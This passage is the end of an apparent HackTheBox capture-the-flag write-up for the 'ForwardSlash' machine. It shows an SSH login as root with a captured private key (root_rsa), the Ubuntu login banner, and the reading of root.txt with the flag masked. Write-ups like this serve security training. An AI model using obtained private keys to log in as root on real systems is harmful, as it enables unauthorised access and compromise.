╭─blackarch-corshine
╰─❯ ssh -i root_rsa root@forwardslash.htb 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Apr 21 16:39:39 UTC 2020

  System load:  0.0                Processes:            190
  Usage of /:   30.6% of 19.56GB   Users logged in:      1
  Memory usage: 11%                IP address for ens33: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Mar 24 12:11:46 2020 from 10.10.14.3
root@forwardslash:~# cat root.txt
01-------------------------------
root@forwardslash:~# 
```

***

![]({{ "/images/mandatory/pwned.png" | relative_url }})

